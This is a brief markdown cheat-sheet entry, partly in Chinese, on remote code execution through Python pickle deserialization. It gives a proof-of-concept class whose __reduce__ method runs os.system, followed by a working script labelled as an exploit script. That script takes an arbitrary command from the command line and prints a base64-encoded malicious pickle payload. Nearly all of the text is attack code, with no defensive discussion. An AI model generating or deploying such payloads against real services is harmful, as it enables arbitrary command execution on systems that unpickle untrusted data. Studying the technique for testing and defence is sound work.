# Python

## Pickle

### RCE
poc
```
class Exploit(object):
    def __reduce__(self):
        return (os.system,('ls',))
```
利用脚本

```
import _pickle as cPickle
import sys
import base64

COMMAND = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(cPickle.dumps(PickleRce())))
```